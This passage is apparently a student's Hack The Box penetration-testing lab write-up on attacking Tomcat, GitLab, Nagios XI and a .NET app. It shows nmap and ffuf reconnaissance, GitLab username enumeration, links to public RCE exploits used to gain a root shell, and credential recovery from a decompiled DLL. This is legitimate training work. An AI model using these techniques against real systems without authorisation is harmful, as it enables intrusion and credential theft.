  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>

```

### Exploiting 2

[source](https://www.zscaler.com/blogs/security-research/cve-2025-24813-apache-tomcat-vulnerable-rce-attacks)

### E 3

[source](https://github.com/jaiguptanick/CVE-2019-0232/tree/main)

I dinit find 

```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.129.14.228:8080/cgi/FUZZ.bat -s
cmd

```

![Screenshot_2026-05-27_21_17_20.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-27_21_17_20.png)

# **Attacking Common Applications - Skills Assessment II**

## Enumeration

I rejestered and account then navigated to the help page to see the version 

```jsx
GitLab Community Edition 13.12.11 
```

```jsx
$ nmap 10.129.201.90 -sV                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 23:34 +03
Nmap scan report for gitlab.inlanefreight.local (10.129.201.90)
Host is up (0.46s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
8180/tcp open  http     nginx
Service Info: Host:  skills2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.25 seconds

```

public gitlabs

![Screenshot_2026-05-27_23_36_17.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-27_23_36_17.png)

### Known vulnerability

https://www.cybersecurity-help.cz/vdb/soft/gitlab/gitlab/13.12.11/

### Username enumeration

```jsx
$ python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt 
GitLab User Enumeration in python
[+] The username root exists!
[+] The username admin exists!
[+] The username test exists!
[+] The username guest exists!
[+] The username info exists!
[+] The username adm exists!
[+] The username mysql exists!
[+] The username user exists!
[+] The username administrator exists!
[+] The username oracle exists!
[+] The username ftp exists!
[+] The username pi exists!
[+] The username puppet exists!
[+] The username ansible exists!
[+] The username ec2-user exists!
[+] The username vagrant exists!
[+] The username azureuser exists!

```

### Enumerating vhosts

Note i filted the home page of the target host to avoid false result

```jsx
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://10.129.201.90/ -H "Host: FUZZ.inlanefreight.local" -s -fs 46166
blog
monitoring
gitlab

```

the blog vhost runs a wordpress 

```jsx
<meta name="generator" content="WordPress 5.8" />
```

the application running on monitoring vhost:

![Screenshot_2026-05-28_01_01_11.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_01_01_11.png)

![Screenshot_2026-05-28_01_27_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_01_27_30.png)

optaining shell https://github.com/sarcastic-rant/nagiosxi-root-rce-exploit/tree/master

![Screenshot_2026-05-28_02_02_12.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_02_02_12.png)

![Screenshot_2026-05-28_02_24_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_02_24_43.png)

```jsx
root@skills2:/# find / -name *flag* 2>/dev/null | grep txt
find / -name *flag* 2>/dev/null | grep txt
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt

```

# **Attacking Common Applications - Skills Assessment III**

I found the dll in:

```jsx
C:\inetpub\wwwroot\bin
```

then uesed dnSpy to decompile it, and found the credentails for MSSQL service stored in the file

![Screenshot_2026-05-29_12_04_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/2f5c747d-2da7-42a4-b454-34da25a56054.png)